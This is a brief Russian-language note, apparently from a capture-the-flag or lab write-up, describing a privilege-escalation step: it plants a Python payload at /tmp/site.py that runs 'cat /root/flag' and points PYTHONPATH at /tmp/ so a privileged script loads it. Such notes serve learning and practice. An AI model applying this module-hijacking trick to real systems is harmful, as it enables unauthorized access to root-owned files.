Видим два скрипта
![](../../attachment/Pasted%20image%2020250624142715.png)
создадим нагрузку /tmp/site.py
```
import os                     
os.system('cat /root/flag')

```
Значение переменного окружения PYTHONPATH зададим в /tmp/